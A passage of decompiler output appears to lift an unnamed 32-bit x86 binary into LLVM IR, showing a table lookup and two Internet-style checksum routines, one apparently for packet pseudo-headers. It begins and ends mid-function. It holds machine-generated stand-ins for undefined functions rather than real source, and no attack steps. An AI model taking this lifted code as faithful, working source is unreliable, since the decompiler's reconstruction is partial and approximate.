168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 213, 215, 214, 209, 210, 211, 212, 216, 217, 218, 219, 220, 221, 222, 223, 224, 243, 244, 245, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 276, 277, 246, 247, 248, 249, 250, 251, 260, 261, 252, 253, 254, 255, 256, 257, 258, 259, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 289, 290, 278, 279, 280, 281, 284, 285, 282, 283, 62, 59, 286, 287, 288, 298, 291, 292, 293, 294, 295, 296, 297, 299, 300, 301 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 13, 14, 15, 16, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 22, 25, 24, 18, 26, 27, 28, 29, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 98, 99, 100, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 174, 175, 176, 177, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 89, 86, 87, 88, 84, 90, 91, 92, 93, 94, 95, 96, 97, 150, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 162, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 163, 164, 165, 166, 167, 168, 169, 171, 170, 23, 172, 173 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 16, 17, 7, 10, 11, 12, 13, 14, 15, 18, 19, 20, 21, 22, 8, 9, 23, 33, 24, 25, 26, 27, 28, 29, 35, 61, 62, 30, 31, 32, 34, 36, 37, 38, 39, 40, 41, 44, 45, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 57, 55, 58, 59, 60, 110, 111, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 112, 113, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 27, 28, 29, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 439, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 34, 35, 36, 37, 60, 61, 62, 63, 64, 65, 66, 68, 69, 70, 71, 73, 74, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 67, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 211, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 498, 499, 218, 219, 220, 221, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 222, 223, 224, 238, 239, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 240, 241, 242, 243, 245, 246, 244, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 266, 267, 271, 272, 268, 269, 270, 264, 265, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 411, 412, 416, 413, 414, 415, 417, 418, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 459, 460, 461, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 434, 435, 432, 433, 436, 437, 438, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 487, 454, 455, 456, 457, 458, 488, 489, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 481, 482, 479, 480, 76, 72, 483, 484, 485, 486, 490, 491, 492, 493, 494, 495, 496, 497 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_80554d4.5 to i32), { 1, 0 }
  uselistorder i32 134567046, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_8052720(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804de40() local_unnamed_addr {
dec_label_pc_804de40:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804de47 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804de65, label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %dec_label_pc_804de40, %dec_label_pc_804de50
  %v0_804de5e = phi i32 [ %v2_804de5e, %dec_label_pc_804de50 ], [ 0, %dec_label_pc_804de40 ]
  %v0_804de53 = phi i32 [ %v1_804de53, %dec_label_pc_804de50 ], [ %tmp11, %dec_label_pc_804de40 ]
  %v0_804de5b = phi i32 [ %v1_804de5b, %dec_label_pc_804de50 ], [ %v4_804de47, %dec_label_pc_804de40 ]
  %v1_804de50 = inttoptr i32 %v0_804de5b to i16*
  %v2_804de50 = load i16, i16* %v1_804de50, align 2
  %v3_804de50 = zext i16 %v2_804de50 to i32
  %v1_804de53 = add i32 %v0_804de53, -2
  %v1_804de5b = add i32 %v0_804de5b, 2
  %v2_804de5e = add i32 %v3_804de50, %v0_804de5e
  %v5_804de60 = icmp eq i32 %v1_804de53, 0
  %v9_804de60 = icmp eq i32 %v0_804de53, 3
  %v2_804de63 = or i1 %v9_804de60, %v5_804de60
  br i1 %v2_804de63, label %dec_label_pc_804de65.loopexit, label %dec_label_pc_804de50

dec_label_pc_804de65.loopexit:                    ; preds = %dec_label_pc_804de50
  br label %dec_label_pc_804de65

dec_label_pc_804de65:                             ; preds = %dec_label_pc_804de65.loopexit, %dec_label_pc_804de40
  %v0_804de6b = phi i32 [ %v2_804de5e, %dec_label_pc_804de65.loopexit ], [ 0, %dec_label_pc_804de40 ]
  %v0_804de68 = phi i32 [ %v1_804de5b, %dec_label_pc_804de65.loopexit ], [ %v4_804de47, %dec_label_pc_804de40 ]
  %v0_804de65 = phi i32 [ %v1_804de53, %dec_label_pc_804de65.loopexit ], [ %tmp11, %dec_label_pc_804de40 ]
  %v8_804de65 = icmp eq i32 %v0_804de65, 1
  %v1_804de66 = icmp eq i1 %v8_804de65, false
  br i1 %v1_804de66, label %dec_label_pc_804de6d, label %dec_label_pc_804de68

dec_label_pc_804de68:                             ; preds = %dec_label_pc_804de65
  %v1_804de68 = inttoptr i32 %v0_804de68 to i8*
  %v2_804de68 = load i8, i8* %v1_804de68, align 1
  %v3_804de68 = sext i8 %v2_804de68 to i32
  %v2_804de6b = add i32 %v3_804de68, %v0_804de6b
  br label %dec_label_pc_804de6d

dec_label_pc_804de6d:                             ; preds = %dec_label_pc_804de65, %dec_label_pc_804de68
  %v0_804de6d = phi i32 [ %v0_804de6b, %dec_label_pc_804de65 ], [ %v2_804de6b, %dec_label_pc_804de68 ]
  %v1_804de6f = urem i32 %v0_804de6d, 65536
  %v2_804de72 = udiv i32 %v0_804de6d, 65536
  %v2_804de76 = add nuw nsw i32 %v1_804de6f, %v2_804de72
  %v2_804de7a = udiv i32 %v2_804de76, 65536
  %v2_804de7d = add nuw nsw i32 %v2_804de7a, %v2_804de76
  %v1_804de7f = urem i32 %v2_804de7d, 65536
  %v1_804de82 = xor i32 %v1_804de7f, 65535
  ret i32 %v1_804de82

; uselistorder directives
  uselistorder i32 %v2_804de76, { 1, 0 }
  uselistorder i32 %v0_804de6b, { 1, 0 }
  uselistorder i32 %v1_804de53, { 0, 2, 1 }
  uselistorder i32 %v4_804de47, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804de6d, { 1, 0 }
  uselistorder label %dec_label_pc_804de50, { 1, 0 }
}

define i32 @function_804de90() local_unnamed_addr {
dec_label_pc_804de90:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804dea5 = ptrtoint i16* %tmp14 to i32
  %v1_804deae = add i32 %tmp17, 12
  %v2_804deae = inttoptr i32 %v1_804deae to i32*
  %v3_804deae = load i32, i32* %v2_804deae, align 4
  %v1_804deb1 = add i32 %tmp17, 16
  %v2_804deb1 = inttoptr i32 %v1_804deb1 to i32*
  %v3_804deb1 = load i32, i32* %v2_804deb1, align 4
  %v7_804deb7 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804deb7, label %dec_label_pc_804dec0, label %dec_label_pc_804ded5

dec_label_pc_804dec0:                             ; preds = %dec_label_pc_804de90, %dec_label_pc_804dec0
  %v0_804dece = phi i32 [ %v2_804dece, %dec_label_pc_804dec0 ], [ 0, %dec_label_pc_804de90 ]
  %v0_804dec3 = phi i32 [ %v1_804dec3, %dec_label_pc_804dec0 ], [ %tmp16, %dec_label_pc_804de90 ]
  %v0_804decb = phi i32 [ %v1_804decb, %dec_label_pc_804dec0 ], [ %v4_804dea5, %dec_label_pc_804de90 ]
  %v1_804dec0 = inttoptr i32 %v0_804decb to i16*
  %v2_804dec0 = load i16, i16* %v1_804dec0, align 2
  %v3_804dec0 = zext i16 %v2_804dec0 to i32
  %v1_804dec3 = add i32 %v0_804dec3, -2
  %v1_804decb = add i32 %v0_804decb, 2
  %v2_804dece = add i32 %v3_804dec0, %v0_804dece
  %v1_804ded0 = add i32 %v0_804dec3, -3
  %v6_804ded0 = sub i32 2, %v0_804dec3
  %v7_804ded0 = and i32 %v1_804dec3, %v6_804ded0
  %v8_804ded0 = icmp slt i32 %v7_804ded0, 0
  %v9_804ded0 = icmp eq i32 %v1_804ded0, 0
  %v10_804ded0 = icmp slt i32 %v1_804ded0, 0
  %v3_804ded3 = icmp eq i1 %v10_804ded0, %v8_804ded0
  %v4_804ded3 = icmp eq i1 %v9_804ded0, false
  %v5_804ded3 = and i1 %v4_804ded3, %v3_804ded3
  br i1 %v5_804ded3, label %dec_label_pc_804dec0, label %dec_label_pc_804ded5.loopexit

dec_label_pc_804ded5.loopexit:                    ; preds = %dec_label_pc_804dec0
  br label %dec_label_pc_804ded5

dec_label_pc_804ded5:                             ; preds = %dec_label_pc_804ded5.loopexit, %dec_label_pc_804de90
  %v0_804df40 = phi i32 [ %v2_804dece, %dec_label_pc_804ded5.loopexit ], [ 0, %dec_label_pc_804de90 ]
  %v0_804df3e = phi i32 [ %v1_804decb, %dec_label_pc_804ded5.loopexit ], [ %v4_804dea5, %dec_label_pc_804de90 ]
  %v0_804ded5 = phi i32 [ %v1_804dec3, %dec_label_pc_804ded5.loopexit ], [ %tmp16, %dec_label_pc_804de90 ]
  %v8_804ded5 = icmp eq i32 %v0_804ded5, 1
  br i1 %v8_804ded5, label %dec_label_pc_804df3c, label %dec_label_pc_804ded8

dec_label_pc_804ded8:                             ; preds = %dec_label_pc_804ded5, %dec_label_pc_804df3c
  %v0_804dee6 = phi i32 [ %v0_804df40, %dec_label_pc_804ded5 ], [ %v2_804df40, %dec_label_pc_804df3c ]
  %v2_804dedc = udiv i32 %v3_804deb1, 65536
  %v1_804dedf = add i32 %tmp17, 9
  %v2_804dedf = inttoptr i32 %v1_804dedf to i8*
  %v3_804dedf = load i8, i8* %v2_804dedf, align 1
  %v1_804dee2 = zext i8 %v3_804dedf to i16
  %v2_804dee2 = call i16 @llvm.bswap.i16(i16 %v1_804dee2)
  %v3_804dee2 = zext i16 %v2_804dee2 to i32
  %v2_804dee6 = add i32 %v0_804dee6, %v2_804dedc
  %v2_804deee = add i32 %v2_804dee6, %v3_804dee2
  %v1_804def4 = urem i32 %v3_804deae, 65536
  %v2_804defa = udiv i32 %v3_804deae, 65536
  %v1_804df01 = urem i32 %v3_804deb1, 65536
  %v4_804df09 = zext i16 %tmp15 to i32
  %v2_804defd = add nuw nsw i32 %v2_804defa, %v4_804df09
  %v2_804df07 = add nuw nsw i32 %v2_804defd, %v1_804def4
  %v2_804df14 = add nuw nsw i32 %v2_804df07, %v1_804df01
  %v2_804df16 = add i32 %v2_804df14, %v2_804deee
  %tmp = icmp ult i32 %v2_804df16, 65536
  br i1 %tmp, label %dec_label_pc_804df2e, label %dec_label_pc_804df20

dec_label_pc_804df20:                             ; preds = %dec_label_pc_804ded8, %dec_label_pc_804df20
  %v2_804df253 = phi i32 [ %v2_804df25, %dec_label_pc_804df20 ], [ %v2_804df16, %dec_label_pc_804ded8 ]
  %v2_804df294.in = phi i32 [ %v2_804df25, %dec_label_pc_804df20 ], [ %v2_804df16, %dec_label_pc_804ded8 ]
  %v2_804df294 = udiv i32 %v2_804df294.in, 65536
  %v1_804df20 = urem i32 %v2_804df253, 65536
  %v2_804df25 = add nuw nsw i32 %v1_804df20, %v2_804df294
  %tmp25 = icmp ult i32 %v2_804df25, 65536
  %v1_804df2c = icmp eq i1 %tmp25, false
  br i1 %v1_804df2c, label %dec_label_pc_804df20, label %dec_label_pc_804df2e.loopexit

dec_label_pc_804df2e.loopexit:                    ; preds = %dec_label_pc_804df20
  br label %dec_label_pc_804df2e

dec_label_pc_804df2e:                             ; preds = %dec_label_pc_804df2e.loopexit, %dec_label_pc_804ded8
  %v0_804df2e = phi i32 [ %v2_804df25, %dec_label_pc_804df2e.loopexit ], [ %v2_804df16, %dec_label_pc_804ded8 ]
  %v1_804df2e = urem i32 %v0_804df2e, 65536
  %v1_804df32 = xor i32 %v1_804df2e, 65535
  ret i32 %v1_804df32

dec_label_pc_804df3c:                             ; preds = %dec_label_pc_804ded5
  %v1_804df3e = inttoptr i32 %v0_804df3e to i8*
  %v2_804df3e = load i8, i8* %v1_804df3e, align 1
  %v3_804df3e = zext i8 %v2_804df3e to i32
  %v2_804df40 = add i32 %v3_804df3e, %v0_804df40
  br label %dec_label_pc_804ded8

; uselistorder directives
  uselistorder i32 %v2_804df25, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804df16, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804ded0, { 1, 0 }
  uselistorder i32 %v1_804dec3, { 0, 2, 1 }
  uselistorder i32 %v3_804deb1, { 1, 0 }
  uselistorder i32 %v4_804dea5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df20, { 1, 0 }
  uselistorder label %dec_label_pc_804ded8, { 1, 0 }
  uselistorder label %dec_label_pc_804dec0, { 1, 0 }
}

define i32 @function_804df70(i32 %arg1) local_unnamed_addr {
dec_label_pc_804df70:
  %eax.global-to-local = alloca i32, align 4
